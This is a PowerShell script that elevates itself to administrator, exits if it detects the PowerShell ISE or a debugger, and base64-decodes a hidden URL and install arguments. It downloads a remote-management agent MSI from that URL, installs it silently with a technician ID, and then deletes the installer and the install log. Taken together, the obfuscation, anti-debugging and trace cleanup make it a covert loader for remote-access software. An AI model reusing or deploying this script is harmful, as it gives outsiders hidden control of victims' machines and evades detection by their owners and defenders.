# -------------------------------
# Check if running as Admin, if not, relaunch with admin privileges
# -------------------------------
if (-not (Test-Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA")) {
    $isElevated = [Security.Principal.WindowsIdentity]::GetCurrent().Owner.IsWellKnown([System.Security.Principal.WellKnownSidType]::BuiltinAdministratorsSid)
} else {
    $isElevated = $false
}

if (-not $isElevated) {
    $arguments = $MyInvocation.Line
    Start-Process powershell.exe -ArgumentList "Start-Process powershell -ArgumentList '$arguments' -Verb runAs" -Verb runAs
    exit
}

# -------------------------------
# Basic Anti-Debug / Anti-ISE
# -------------------------------
if ($host.Name -match "ISE") { exit }
if ([System.Diagnostics.Debugger]::IsAttached) { exit }

# -------------------------------
# String Decoder
# -------------------------------
function d($s) {
    [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($s))
}

# -------------------------------
# Obfuscated Values
# -------------------------------
$u  = d("aHR0cHM6Ly9zdXBlcm9wcy13aW5pbnN0YWxsZXItcHJvZC5zMy51cy1lYXN0LTIuYW1hem9uYXdzLmNvbS9hZ2VudC83ODE2MjUwNzgxNzkxMTkxMDQvNVhTNllSVUlEREtXXzE5U1ZFUFQ2SjNEMzRfd2luZG93c194NjQubXNp")
$p  = d("LTE=")
$t  = d("dXJsPWh0dHBzOi8vc3VwZXJvcHMtd2luaW5zdGFsbGVyLXByb2QuczMudXMtZWFzdC0yLmFtYXpvbmF3cy5jb20vYWdlbnQvNzgxNjI1MDc4MTc5MTE5MTA0LzVYUzZZUlVJREtXXzE5U1ZFUFQ2SjNEMzRfd2luZG93c194NjQubXNpOnNvdXJjZUluc3RhbGw9c2lsZW50OnRlY2huaWNpYW5JZD04Njg3NjQzODEyOTk0NTI3MjMy")

$f = [IO.Path]::GetFileName($u)
$logFile = "install.log"

# -------------------------------
# TLS + Download
# -------------------------------
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest -Uri $u -OutFile $f -UseBasicParsing

# -------------------------------
# Silent Install
# -------------------------------
$args = "/i `"$f`" /qn LicenseAccepted=YES POLICY_CATEGORY_ID=$p INSTALL_ARGS=`"$t`" /L*V $logFile"
Start-Process -FilePath "msiexec.exe" -ArgumentList $args -Wait

# -------------------------------
# Delete the downloaded file and installation log after installation
# -------------------------------
Remove-Item -Path $f -Force
Remove-Item -Path $logFile -Force
